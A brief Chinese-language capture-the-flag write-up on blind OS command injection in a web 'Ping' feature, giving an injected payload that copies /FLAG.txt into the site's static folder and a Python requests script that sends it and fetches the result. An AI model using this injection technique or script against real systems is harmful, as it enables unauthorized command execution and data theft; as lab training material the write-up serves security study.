# X-037-24 Is There Anybody Out There? - Blind

> Almost blind command injection

首页提供一个“Ping”功能，输入 IP 后后台会执行系统的 `ping` 命令并回显“是否可达”。常见此类功能容易直接拼接系统命令导致 OS 命令注入。虽然页面不回显命令输出，但可通过把命令结果重定向写入到站点的静态目录，再直接 HTTP 访问该文件以读取内容，从而实现信息外带。

利用 payload（将容器内 `/FLAG.txt` 内容写入静态文件）：

```
127.0.0.1; cat /FLAG.txt > static/flag.txt; #
```

随后访问 `GET /static/flag.txt` 读取重定向写入的内容：
![image.png](https://x/x12110519533.png)

## EXP
```python
import requests

base = "http://ip32800"

payload = "127.0.0.1; cat /FLAG.txt > static/flag.txt; #"

requests.post(base + "/ping", data={"ip_address": payload})

r = requests.get(base + "/static/flag.txt")
print(r.text)
```